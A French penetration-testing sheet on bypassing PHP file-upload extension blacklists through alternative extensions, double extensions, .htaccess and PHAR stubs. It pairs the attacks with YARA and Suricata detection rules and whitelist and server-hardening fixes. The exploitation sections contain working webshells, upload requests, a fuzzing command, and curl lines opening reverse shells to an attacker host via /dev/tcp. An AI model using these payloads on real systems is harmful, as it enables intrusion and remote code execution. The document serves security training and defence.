---
title: "Contournement des filtres d'extensions PHP (Listes noires & Extensions alternatives)"
description: "Fiche technique sur l'exploitation des listes noires d'extensions PHP via l'utilisation d'extensions alternatives exécutables et la mauvaise configuration des handlers du serveur web."
tags:
  - file-upload
  - php
  - bypass
  - web-security
  - rce
  - apache
  - nginx
  - blacklist
  - phar
  - mime-type
---

# Contournement des filtres d'extensions PHP (Listes noires)

!!! warning "Cadre légal"
    Les techniques décrites dans cette fiche sont présentées à des fins de recherche en sécurité offensive et défensive. Leur mise en œuvre sans autorisation explicite et écrite du propriétaire du système cible constitue une infraction pénale.

---

## 1. Résumé Exécutif & Contexte

### Pourquoi les listes noires sont un anti-pattern

Les mécanismes de filtrage par **liste noire** (*blacklist*) interdisent un ensemble d'extensions ou de types de fichiers explicitement identifiés comme dangereux, laissant tout le reste autorisé par défaut. Cette approche repose sur une hypothèse fondamentalement incorrecte : qu'il est possible d'énumérer **exhaustivement** l'ensemble des extensions susceptibles de déclencher l'interprétation d'un fichier PHP par le serveur web.

Or, cette liste est nécessairement incomplète. Le nombre d'extensions reconnues par les différents modules PHP (`mod_php`, `php-fpm`, `FastCGI`) selon la distribution Linux, la version d'Apache ou de Nginx et la configuration locale du serveur rend toute liste noire intrinsèquement insuffisante. Il suffit qu'**une seule** extension non listée soit interprétée par le serveur pour que le filtre soit contourné.

!!! danger "Anti-pattern fondamental"
    Une liste noire d'extensions n'est pas une mesure de sécurité robuste — c'est une surface d'attaque inversée : l'attaquant n'a besoin de trouver qu'**une** extension oubliée parmi des dizaines possibles, tandis que le défenseur doit les avoir toutes anticipées. La seule approche correcte est la liste blanche stricte (*whitelist*).

### Impact : Exécution de code à distance (RCE)

L'objectif final de ce vecteur d'attaque est l'upload d'un fichier PHP malveillant (`webshell`) sur le serveur cible, suivi de son accès via une requête HTTP directe. L'exécution du fichier par l'interpréteur PHP côté serveur permet :

| Impact | Description |
| --- | --- |
| **RCE (Remote Code Execution)** | Exécution arbitraire de commandes système sous l'identité du processus web (`www-data`, `apache`, `nginx`) |
| **Lecture de fichiers sensibles** | Accès à `/etc/passwd`, fichiers de configuration, clés privées, variables d'environnement |
| **Pivot réseau** | Le webshell sert de point d'entrée vers le réseau interne, invisible depuis l'extérieur |
| **Persistance** | Dépôt de backdoors supplémentaires, de reverse shells ou de loaders secondaires |
| **Escalade de privilèges** | Point de départ vers une élévation locale si le processus web tourne avec des droits élevés ou si SUID est exploitable |

---

## 2. Mécanisme & Fonctionnement Interne

### 2.1 Association extension → interpréteur : comment ça marche

Quand un serveur web reçoit une requête pour un fichier, il détermine comment traiter ce fichier selon **trois mécanismes distincts** pouvant coexister :

```
Requête HTTP : GET /uploads/shell.phtml
         ↓
Serveur Web (Apache/Nginx)
         ↓
1. MIME Type résolu depuis l'extension du fichier
2. Handler ou Module associé à ce MIME type (ou directement à l'extension)
3. Transmission au bon interpréteur (PHP via mod_php, FastCGI, FPM)
         ↓
Interpréteur PHP exécute le fichier
         ↓
Réponse HTTP avec sortie du script
```

### 2.2 Apache — Directives de configuration et leurs faiblesses

#### `AddHandler` — La directive la plus dangereuse
```apache
# httpd.conf ou .htaccess
# Cette directive globale associe TOUTES les extensions listées au handler PHP
# Problème : elle s'applique même si l'extension PHP n'est pas la dernière
AddHandler application/x-httpd-php .php .php3 .php4 .php5 .phtml
```

!!! danger "Comportement critique d'Apache avec les doubles extensions"
    Apache traite les fichiers en lisant leurs extensions **de droite à gauche**. Si la dernière extension n'est pas reconnue comme un type MIME, Apache remonte à l'extension précédente. Ainsi, un fichier nommé `shell.php.jpg` peut être exécuté comme PHP si `.jpg` n'est pas associé à un type MIME dans la configuration, et que `.php` est géré par `AddHandler`.

    ```bash
    # Fichier uploadé : evil.php.unknownext
    # Apache ne reconnaît pas .unknownext → remonte sur .php → exécution PHP
    # Ce comportement est historique et dépend de la version et config exacte
    ```

#### `SetHandler` — Association directe sans passer par les MIME types
```apache
# Bloc ciblant tous les fichiers dans un répertoire
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>

# Vulnérabilité classique : regex mal écrite capturant trop large
# .+\.ph(p) → matche uniquement .php
# Mais si écrit .ph(p|tml|ar) → couvre phtml et phar également

# Exemple de regex défaillante (trop permissive) :
<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
# Problème : "\.php" est un sous-chemin, pas une ancre de fin.
# "shell.php.jpg" contient "\.php" → exécuté comme PHP
# Forme correcte avec ancre de fin : \.php$
```

#### `.htaccess` — Vecteur d'attaque autonome
```apache
# Si l'upload d'un .htaccess est autorisé dans le répertoire d'upload,
# l'attaquant peut redéfinir les règles d'interprétation pour ce répertoire
# Fichier : /var/www/html/uploads/.htaccess
AddType application/x-httpd-php .jpg .png .gif .whatever
# → TOUS les fichiers image du répertoire sont désormais exécutés comme PHP
```

!!! warning "AllowOverride et .htaccess"
    Si `AllowOverride All` (ou au minimum `AllowOverride FileInfo`) est actif pour le répertoire d'upload, l'upload d'un `.htaccess` malveillant constitue à lui seul un vecteur de RCE complet — indépendamment de toute extension PHP.

### 2.3 Nginx — PHP-FPM et FastCGI

```nginx
# nginx.conf — Configuration standard avec PHP-FPM
server {
    location ~ \.php$ {
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        include        fastcgi_params;
        fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
```

```nginx
# Vulnérabilité : regex trop stricte limitée à .php$
# Extensions alternatives comme .phtml, .php5 ne matchent pas → non exécutées
# → Nginx est généralement MOINS vulnérable aux extensions alternatives que Apache
# → MAIS peut être vulnérable si la regex est élargie ou mal écrite :
location ~ \.(php|phtml|php5|php7)$ {
    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    # ...
}
```

!!! note "Vulnérabilité PATH_INFO (Nginx + PHP-FPM)"
    Une autre classe de vulnérabilité Nginx/FPM distincte : si `cgi.fix_pathinfo=1` est activé dans `php.ini`, une requête vers `shell.jpg/x.php` peut amener FPM à exécuter `shell.jpg` comme PHP. Cette vulnérabilité est distincte des extensions alternatives mais souvent mentionnée dans le même contexte.

### 2.4 Extensions alternatives interprétées — Inventaire complet

| Extension | Historique / Contexte |
| --- | --- |
| `.php` | Extension principale, toujours filtrée |
| `.php3` | PHP 3 (1997-2000), encore reconnue par certains modules Apache |
| `.php4` | PHP 4 (2000-2008), idem |
| `.php5` | PHP 5, encore reconnue dans de nombreuses configs |
| `.php7` | PHP 7, présente dans certaines configs Ubuntu/Debian récentes |
| `.phtml` | *PHP HTML*, extension historique pour les templates PHP, souvent oubliée des listes noires |
| `.pht` | Extension courte, moins connue, reconnue par certaines configs Apache |
| `.phar` | *PHP Archive*, format de packaging PHP avec interprétation native |
| `.phps` | Coloration syntaxique PHP (renvoie normalement le source, mais peut exécuter selon la config) |
| `.inc` | Fichiers d'inclusion PHP, parfois interprétés selon les règles `AddHandler` |
| `.module` | Contexte CMS (Drupal), parfois traité comme PHP |
| `.cgi` | Si Apache est configuré pour exécuter des CGI et que le shebang PHP est présent |
| `.php.jpg` *(double ext)* | Exploitation du comportement multi-extension d'Apache (cf. §2.2) |

!!! tip "Source de référence terrain"
    La liste maintenue par PayloadsAllTheThings est la référence la plus à jour pour les extensions PHP exécutables : `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files`

---

## 3. Empreinte & Détection

### 3.1 Méthodes d'énumération Red Team

#### Fuzzing de l'extension avec Burp Intruder

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.§EXT§"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

```bash
# Liste de wordlist pour Burp Intruder / ffuf — extensions à tester
php
php3
php4
php5
php7
phtml
pht
phar
phps
inc
php.jpg
php%00.jpg     # null byte (PHP < 5.3.4)
pHp
PHP
PhP
pHtMl
PHTML
```

```bash
# Test automatisé avec ffuf en ciblant un endpoint d'upload
# (requiert adaptation du body multipart selon la cible)
ffuf -u https://cible.com/upload \
     -X POST \
     -H "Content-Type: multipart/form-data; boundary=FFUF" \
     -d $'--FFUF\r\nContent-Disposition: form-data; name="file"; filename="shell.FUZZ"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET[cmd]); ?>\r\n--FFUF--' \
     -w /usr/share/wordlists/extensions_php.txt \
     -mc 200
```

#### Vérification de l'exécution après upload

```bash
# Après upload réussi d'un fichier avec extension alternative
# Tester l'exécution via une requête directe

# 1. Commande système simple
curl "https://cible.com/uploads/shell.phtml?cmd=id"
# Réponse attendue si exécution : uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 2. Lecture de fichiers sensibles
curl "https://cible.com/uploads/shell.php5?cmd=cat+/etc/passwd"

# 3. Reverse shell depuis le webshell
curl "https://cible.com/uploads/shell.pht?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

### 3.2 Signatures Blue Team

#### Règles de détection sur les logs d'accès web

```bash
# Rechercher les accès à des extensions PHP alternatives dans les logs Apache/Nginx
grep -iE "\.(phtml|php[3-9]|pht|phar|phps|inc)\s" /var/log/apache2/access.log

# Avec awk pour extraire IP + URL + code de retour
awk '$9 == 200 && $7 ~ /\.(phtml|php[3-9]|pht|phar)/' /var/log/nginx/access.log
```

#### Règle YARA — Détection de webshells PHP dans les répertoires d'upload

```yara
rule PHP_Webshell_Alternative_Extension {
    meta:
        description = "Détecte des webshells PHP avec extensions alternatives dans les répertoires d'upload"
        severity = "CRITICAL"
        author = "Blue Team"

    strings:
        // Fonctions d'exécution système communes aux webshells
        $exec1 = "system(" ascii nocase
        $exec2 = "exec(" ascii nocase
        $exec3 = "shell_exec(" ascii nocase
        $exec4 = "passthru(" ascii nocase
        $exec5 = "proc_open(" ascii nocase
        $exec6 = "popen(" ascii nocase

        // Ouverture de tag PHP
        $php_open = "<?php" ascii nocase

        // Paramètre GET/POST souvent utilisé pour passer la commande
        $param1 = "$_GET[" ascii
        $param2 = "$_POST[" ascii
        $param3 = "$_REQUEST[" ascii

    condition:
        $php_open and (1 of ($exec*)) and (1 of ($param*))
}
```

#### Règle Suricata — Détection réseau des requêtes vers extensions alternatives

```yaml
# suricata.rules
alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"ET WEB_SERVER PHP Alternative Extension Access - Possible Webshell";
    flow:established,to_server;
    http.uri;
    content:".phtml"; nocase; fast_pattern;
    pcre:"/\.(phtml|php[3-9]|pht|phar|phps)/i";
    classtype:web-application-attack;
    sid:9000001; rev:1;
)
```

#### Audit des répertoires d'upload en Blue Team

```bash
# Identifier tous les fichiers PHP et extensions alternatives dans les répertoires d'upload
find /var/www/html/uploads -type f \
    -iregex ".*\.\(php[0-9]?\|phtml\|pht\|phar\|phps\|inc\)" \
    -ls 2>/dev/null

# Surveillance en temps réel avec inotifywait (Linux)
inotifywait -m -r -e create,moved_to /var/www/html/uploads/ \
    --format '%w%f' | while read filepath; do
    if echo "$filepath" | grep -qiE "\.(phtml|php[3-9]|pht|phar|phps)$"; then
        echo "[ALERT] Fichier suspect déposé : $filepath"
        # Déplacer en quarantaine
        mv "$filepath" /var/quarantine/
    fi
done
```

---

## 4. Méthodologie d'Exploitation & Variantes

### Scénario 1 : Utilisation des extensions secondaires classiques

**Contexte :** Application avec filtre liste noire bloquant `.php` mais autorisant upload de `.phtml`, `.php5`, ou `.pht`.

**Payload minimal (webshell PHP) :**

```php
<?php
// Webshell minimaliste — exécute la commande passée en paramètre GET
if(isset($_GET['cmd'])) {
    system(htmlspecialchars_decode($_GET['cmd']));
}
?>
```

**Requête HTTP multipart/form-data :**

```http
POST /upload.php HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----FormBoundary7MA4YWxkTrZu0gW
Cookie: PHPSESSID=abc123def456

------FormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.phtml"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------FormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

Upload
------FormBoundary7MA4YWxkTrZu0gW--
```

```http
HTTP/1.1 200 OK
Content-Type: text/html

File uploaded successfully: /uploads/shell.phtml
```

```bash
# Vérification de l'exécution
curl "https://cible.com/uploads/shell.phtml?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Escalade vers un reverse shell interactif
curl "https://cible.com/uploads/shell.phtml?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.1.100/4444%200>%261'"
```

!!! tip "Extensions à tester en priorité selon la configuration cible"
    - **Ubuntu/Debian + Apache** : `.phtml`, `.php5`, `.php7` sont souvent reconnues nativement
    - **CentOS/RHEL + Apache** : `.phtml`, `.php3`, `.pht` ont une bonne couverture historique
    - **Toute distribution** : tester `.phar` en dernier recours (cf. Scénario 2)

### Scénario 2 : Exploitation du format PHAR

**Contexte :** L'extension `.phar` est reconnue par le runtime PHP comme un format d'archive exécutable natif. Si le serveur web est configuré pour interpréter `.phar` comme PHP (via `AddHandler` ou une config FastCGI incluant `.phar`), l'accès HTTP direct à l'archive exécute le stub PHP qu'elle contient.

**Création d'un PHAR malveillant contenant un webshell :**

```php
<?php
// Création d'une archive PHAR contenant un webshell
// À exécuter en CLI sur la machine de l'attaquant (phar.readonly = 0 requis dans php.ini)

$phar = new Phar('evil.phar');
$phar->startBuffering();

// Le "stub" est le code PHP exécuté quand l'archive est chargée directement
$phar->setStub('<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>');

// Ajouter des fichiers leurres pour diminuer la suspicion
$phar->addFromString('index.php', '<?php echo "Hello World"; ?>');
$phar->addFromString('style.css', 'body { color: black; }');

$phar->stopBuffering();

echo "PHAR créé : evil.phar\n";
?>
```

```bash
# Génération du PHAR en ligne de commande
php -d phar.readonly=0 create_phar.php

# Vérification de la structure
php -r "var_dump(new Phar('evil.phar'));"
```

**Upload et exécution :**

```http
POST /upload.php HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="file"; filename="archive.phar"
Content-Type: application/octet-stream

[contenu binaire du fichier evil.phar]
------FormBoundary--
```

```bash
# Accès direct au PHAR — exécution du stub si le serveur interprète .phar
curl "https://cible.com/uploads/archive.phar?cmd=whoami"
```

!!! note "PHAR et désérialisation"
    Le format PHAR est également central dans une classe d'attaques distincte : l'exploitation de **gadgets de désérialisation PHP** via le wrapper `phar://`. Lorsqu'une fonction PHP manipulant des fichiers (`file_get_contents`, `fopen`, `is_file`, etc.) accepte un chemin contrôlé par l'attaquant, le préfixe `phar://` force la désérialisation des métadonnées de l'archive, potentiellement en déclenchant des gadget chains. Cette technique est distincte de l'exécution directe par accès HTTP.

### Variante : Insensibilité à la casse selon l'OS et le serveur

**Contexte :** Windows est insensible à la casse par défaut (système de fichiers NTFS). Linux (ext4) est sensible à la casse, **mais certains modules Apache et certaines regex de filtrage le sont moins** selon leur implémentation.

```bash
# Extensions en majuscules ou mélange de casse à tester
shell.PHP
shell.PhP
shell.pHp
shell.PHP5
shell.PHTML
shell.pHtMl

# Sous Windows IIS/PHP, tous ces noms sont équivalents à shell.php
# Sous Apache Linux avec mod_php et AddHandler, le comportement dépend
# des flags de compilation et de la directive "AcceptPathInfo"
```

!!! warning "Validation côté serveur et casse"
    Un filtre PHP vérifiant l'extension avec `strtolower()` gère correctement la casse. Un filtre utilisant une comparaison directe (`$ext === 'php'`) sera contourné par `.PHP` ou `.PhP`. Tester systématiquement les variantes en majuscules, même si Linux est globalement case-sensitive au niveau filesystem.

### Variante : Mauvais matching de regex et double extension

**Configuration Apache vulnérable — regex sans ancre de fin :**

```apache
# VULNÉRABLE : la regex \.php matche à n'importe quel endroit du nom de fichier
<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
# shell.php.jpg → contient "\.php" → EXÉCUTÉ comme PHP
```

```apache
# CORRECT : ancre de fin $ force le match uniquement en fin de nom
<FilesMatch "\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
# shell.php.jpg → ne termine pas par \.php → NON exécuté
```

**Exploitation de la double extension avec Apache multi-extension :**

```bash
# Noms de fichiers à tester exploitant le traitement multi-extension d'Apache
shell.php.jpg           # Si jpg n'est pas un MIME type connu, remonte sur .php
shell.php.xxxunknown    # Extension inconnue → Apache remonte à .php
shell.php.              # Point final (peut tronquer selon l'OS/la version)
shell.php%20            # Espace URL-encodé (versions PHP/Apache anciennes)
shell.php%00.jpg        # Null byte avant .jpg (PHP < 5.3.4 vulnérable)
```

!!! note "Null byte — vulnérabilité historique"
    L'injection de null byte (`%00`) dans le nom de fichier était exploitable sous PHP < 5.3.4 : la fonction `move_uploaded_file()` tronquait le nom au premier `\0`, ignorant le suffixe `.jpg`. Sur les versions modernes de PHP, ce vecteur est corrigé nativement. Il reste pertinent à tester sur des applications legacy.

---

## 5. Remédiation & Hardening

### 5.1 Remplacer la liste noire par une liste blanche stricte

```php
<?php
// ❌ Anti-pattern : liste noire incomplète et contournable
$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml', 'pht', 'phar'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (in_array($ext, $blacklist)) {
    die("Extension interdite");
}
// → oublie .php7, .phps, .inc, variations de casse, double extension, etc.


// ✅ Bonne pratique : liste blanche stricte
$whitelist = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $whitelist, true)) {
    die("Type de fichier non autorisé.");
}
// → tout ce qui n'est pas explicitement listé est rejeté
?>
```

```php
<?php
// ✅ Double vérification : extension + MIME type réel via finfo
$whitelist_ext  = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$whitelist_mime = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

$ext  = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($_FILES['file']['tmp_name']);

if (!in_array($ext, $whitelist_ext, true) || !in_array($mime, $whitelist_mime, true)) {
    die("Fichier non autorisé.");
}
?>
```

### 5.2 Renommage systématique des fichiers uploadés

```php
<?php
// ✅ Ne jamais conserver le nom ou l'extension d'origine fournie par l'utilisateur
// Générer un nom opaque et inconnaissable par l'attaquant

$stored_filename = bin2hex(random_bytes(16)) . '.jpg'; // Extension forcée, indépendante de l'upload
$upload_path = '/var/www/html/uploads/' . $stored_filename;

if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
    // Stocker la correspondance nom original → nom de stockage en base de données
    db_store_file_mapping($_FILES['file']['name'], $stored_filename, $user_id);
    echo "Upload réussi.";
}
// → Même si un webshell est uploadé, son nom est inconnu de l'attaquant
// → Impossible à accéder directement sans connaître le chemin exact généré aléatoirement
?>
```

### 5.3 Isolation du répertoire d'upload — Désactivation de l'exécution

```apache
# Apache — Désactiver TOUTE interprétation de script dans le répertoire d'upload
<Directory "/var/www/html/uploads">
    # Désactive l'interpréteur PHP pour ce répertoire
    php_flag engine off

    # Désactive l'exécution CGI
    Options -ExecCGI

    # Interdit la lecture des .htaccess dans ce répertoire (évite l'upload de .htaccess malveillant)
    AllowOverride None

    # Forcer le type MIME de tous les fichiers du dossier à application/octet-stream
    # → le navigateur télécharge le fichier, il n'est jamais exécuté
    ForceType application/octet-stream
</Directory>
```

```nginx
# Nginx — Désactiver PHP-FPM pour le répertoire d'upload
location /uploads/ {
    # Ne pas passer par le bloc location ~ \.php$ global
    # Le bloc /uploads/ plus spécifique prend la priorité

    # Forcer le type de contenu
    add_header Content-Type application/octet-stream;

    # Optionnel : interdire l'accès aux fichiers PHP explicitement
    location ~* \.(php[0-9]?|phtml|pht|phar|phps)$ {
        deny all;
        return 403;
    }
}
```

```nginx
# Nginx — Désactivation explicite de fastcgi pour le répertoire d'upload
location /uploads/ {
    # Suppression de la directive fastcgi_pass pour ce sous-chemin
    # En Nginx, l'absence du bloc fastcgi_pass empêche l'exécution PHP
    try_files $uri =404;
}
```

### 5.4 Architecture défensive complémentaire

| Mesure | Description |
| --- | --- |
| **Servir les uploads depuis un domaine séparé** | `uploads.cible.com` → si un script est exécuté, il n'a pas accès aux cookies de `cible.com` (Same-Origin Policy) |
| **Stockage hors webroot** | Déplacer les uploads vers `/var/uploads/` (hors `/var/www/html/`) et les servir via un contrôleur PHP téléchargeant le fichier — aucun accès HTTP direct possible |
| **Scan antivirus à l'upload** | Intégration de ClamAV ou d'un service de scan sur chaque fichier reçu avant stockage |
| **Content Security Policy (CSP)** | Limite l'impact d'un XSS via fichier uploadé, mais ne protège pas contre l'exécution PHP directe |
| **Journalisation et alerting** | Alerte sur tout accès HTTP 200 vers le répertoire d'upload pour des extensions non image (cf. §3.2) |

---

## 6. Références & Cheat Sheets

### Ressources offensives

- **PayloadsAllTheThings — File Upload** : [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
  - Listes exhaustives d'extensions PHP alternatives
  - Wordlists prêtes pour Burp Intruder / ffuf
  - Payloads de webshells polyvalents

- **HackTricks — File Upload** : [https://book.hacktricks.xyz/pentesting-web/file-upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

- **PortSwigger Web Security Academy — File Upload** : [https://portswigger.net/web-security/file-upload](https://portswigger.net/web-security/file-upload)
  - Labs pratiques couvrant les extensions alternatives, les double extensions et les contournements `.htaccess`

### Documentation officielle

- **Apache HTTP Server — mod_mime** : [https://httpd.apache.org/docs/current/mod/mod_mime.html](https://httpd.apache.org/docs/current/mod/mod_mime.html)
  - Référence complète des directives `AddHandler`, `SetHandler`, `AddType`, `ForceType`

- **Apache — FilesMatch** : [https://httpd.apache.org/docs/current/mod/core.html#filesmatch](https://httpd.apache.org/docs/current/mod/core.html#filesmatch)
  - Syntaxe des expressions régulières et ancres recommandées

- **Nginx — Configuration des blocs location** : [https://nginx.org/en/docs/http/ngx_http_core_module.html#location](https://nginx.org/en/docs/http/ngx_http_core_module.html#location)

- **PHP — Formats d'archives PHAR** : [https://www.php.net/manual/en/phar.using.intro.php](https://www.php.net/manual/en/phar.using.intro.php)

### Cheat Sheet rapide — Extensions PHP à tester en priorité

```text
php, php3, php4, php5, php7, php8
phtml, pht, phar, phps, inc
PHP, PhP, pHp (variations de casse)
php.jpg, php.unknownext (double extension)
php%00.jpg (null byte, PHP < 5.3.4)
```